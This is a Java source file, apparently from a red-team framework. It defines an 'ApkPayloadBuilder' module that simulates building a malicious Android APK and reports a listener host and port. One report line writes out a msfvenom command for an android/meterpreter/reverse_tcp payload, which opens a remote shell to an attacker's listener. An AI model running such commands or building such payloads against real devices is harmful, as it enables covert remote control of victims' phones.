package fr.redteam.payload;

import fr.redteam.core.Module;
import fr.redteam.core.Report;
import fr.redteam.core.Target;

public class ApkPayloadBuilder implements Module {

    private PayloadConfig config;

    public ApkPayloadBuilder() {
        this.config = new PayloadConfig();
    }

    public ApkPayloadBuilder(PayloadConfig config) {
        this.config = config != null ? config : new PayloadConfig();
    }

    @Override
    public String getName() {
        return "ApkPayloadBuilder";
    }

    @Override
    public String getDescription() {
        return "Construction de payload APK (injection listener)";
    }

    @Override
    public void run(Target target, Report report) {
        String host = target.getHost();
        int port = target.getPort();
        if (host == null || host.isEmpty()) {
            host = config.getListenerHost();
        }
        if (port <= 0) {
            port = config.getListenerPort();
        }

        String outDir = config.getOutputDir();
        String apkName = "payload_" + System.currentTimeMillis() + ".apk";

        report.addFinding("ApkPayloadBuilder", "Listener: " + host + ":" + port);
        report.addFinding("ApkPayloadBuilder", "Sortie (simulée): " + outDir + "/" + apkName);
        report.addFinding("ApkPayloadBuilder", "Exemple msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=" + host + " LPORT=" + port + " -o " + apkName);
    }

    public PayloadConfig getConfig() {
        return config;
    }

    public void setConfig(PayloadConfig config) {
        this.config = config != null ? config : new PayloadConfig();
    }
}
